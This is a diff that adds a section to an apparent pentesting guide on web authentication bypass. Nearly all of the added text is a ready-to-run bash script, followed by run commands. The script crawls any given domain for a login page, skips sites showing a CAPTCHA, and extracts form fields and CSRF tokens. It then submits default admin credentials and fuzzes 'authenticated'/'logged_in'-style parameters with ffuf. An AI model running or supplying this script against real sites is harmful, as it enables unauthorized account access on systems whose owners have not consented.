@@ -192,7 +192,180 @@ If a 400/500 error appears, modify the payload to `' OR 1=2 --` and submit again
 
 ### Parameter Modification <a href="#parameter-modification" id="parameter-modification"></a>
 
+{% hint style="info" %}
+Create Script
+{% endhint %}
 
+```bash
+sudo nano auth-bypass-params.sh
+```
+
+```bash
+#!/bin/bash
+
+# Config & Colors
+RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
+color_print() { printf "${!1}%b${RESET}\n" "$2"; }
+
+# Root Check
+[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }
+
+# Input Check
+if [ $# -lt 1 ]; then
+    echo "Usage: $0 <domain.com>"
+    exit 1
+fi
+
+URL="$1"
+DEPS="git seclists ffuf"
+
+# Install Katana
+if ! command -v katana &>/dev/null; then
+    color_print GREEN "[*] Installing katana ..."
+    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
+fi
+
+# Install Packages
+for pkg in $DEPS; do
+    if ! dpkg -s "$pkg" &>/dev/null; then
+        color_print YELLOW "[!] Installing $pkg..."
+        apt install -y "$pkg"
+    fi
+done
+
+# Find Login Page
+LOGIN=$(katana -u "$URL" -depth 3 -silent | \
+grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
+grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
+sed 's:[/?]*$::' | sed 's:$:/:' | head -n 1)
+
+if [ -z "$LOGIN" ]; then
+    color_print RED "[!] No login page found. Exiting."
+    exit 1
+fi
+
+HTML=$(curl -s "$LOGIN")
+FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)
+
+# CAPTCHA check
+if echo "$HTML" | grep -qiE "g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"; then
+    color_print RED "[!] CAPTCHA detected. Brute-force aborted."
+    exit 1
+fi
+
+# Extract Form Action & Method
+ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
+[ -z "$ACTION" ] && ACTION="$LOGIN"
+
+METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
+[ -z "$METHOD" ] && METHOD="post"
+
+BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
+if [[ "$ACTION" == /* ]]; then
+    FULL_ACTION="${BASE_URL}${ACTION}"
+elif [[ "$ACTION" =~ ^https?:// ]]; then
+    FULL_ACTION="$ACTION"
+else
+    FULL_ACTION=$(dirname "$LOGIN")"/$ACTION"
+fi
+
+# Extract Username & Password Fields
+USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
+PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
+[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
+[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"
+
+# CSRF Token Extraction
+CSRF_FIELD=""
+CSRF_VALUE=""
+HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
+while read -r INPUT; do
+    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
+    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
+    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
+        CSRF_FIELD="$NAME"
+        CSRF_VALUE="$VALUE"
+        break
+    fi
+done <<< "$HIDDEN_INPUTS"
+
+# Prepare POST Data
+DATA="${USERNAME_FIELD}=admin&${PASSWORD_FIELD}=admin12341234"
+[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
+
+COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I' | cut -d';' -f1 | grep -i 'PHPSESSID')
+HEADERS=(
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
+  -H "Accept-Language: en-US,fa-IR;q=0.5"
+  -H "Accept-Encoding: gzip, deflate"
+  -H "Content-Type: application/x-www-form-urlencoded"
+  -H "Origin: $URL"
+  -H "Sec-GPC: 1"
+  -H "Connection: keep-alive"
+  -H "Referer: $LOGIN"
+  -H "Cookie: $COOKIES"
+  -H "Upgrade-Insecure-Requests: 1"
+  -H "Priority: u=0, i"
+)
+
+# Auth Bypass Header
+cat > /tmp/auth_bypass.txt << EOF
+authenticated=yes
+authenticated=true
+authenticated=1
+logged_in=yes
+logged_in=true
+logged_in=1
+is_logged_in=yes
+is_logged_in=true
+is_logged_in=1
+is_authenticated=yes
+is_authenticated=true
+is_authenticated=1
+auth=yes
+auth=true
+auth=1
+auth_user=yes
+auth_user=true
+auth_user=1
+auth_user_id=yes
+auth_user_id=true
+auth_user_id=1
+auth_role=yes
+auth_role=true
+auth_role=1
+auth_role_id=yes
+auth_role_id=true
+auth_role_id=1
+auth_role_name=yes
+auth_role_name=true
+auth_role_name=1
+EOF
+
+# Run FFUF
+if [[ "$METHOD" == "get" ]]; then
+    FFUF_URL="${FULL_ACTION}?${DATA}"
+    ffuf -u "$FFUF_URL?FUZZ" \
+         -w "/tmp/auth_bypass.txt:FUZZ" \
+         -X GET \
+         -ac -c -r -mc 200 \
+         "${HEADERS[@]}"
+else
+    ffuf -u "$FULL_ACTION?FUZZ" \
+         -w "/tmp/auth_bypass.txt:FUZZ" \
+         -X POST -d "$DATA" \
+         -ac -c -r -mc 200 \
+         "${HEADERS[@]}"
+fi
+```
+
+{% hint style="info" %}
+Run Script
+{% endhint %}
+
+```bash
+sudo chmod +x auth-bypass-params.sh;sudo ./auth-bypass-params.sh $WEBSITE
+```
 
 ### Session ID Prediction <a href="#session-id-prediction" id="session-id-prediction"></a>
 
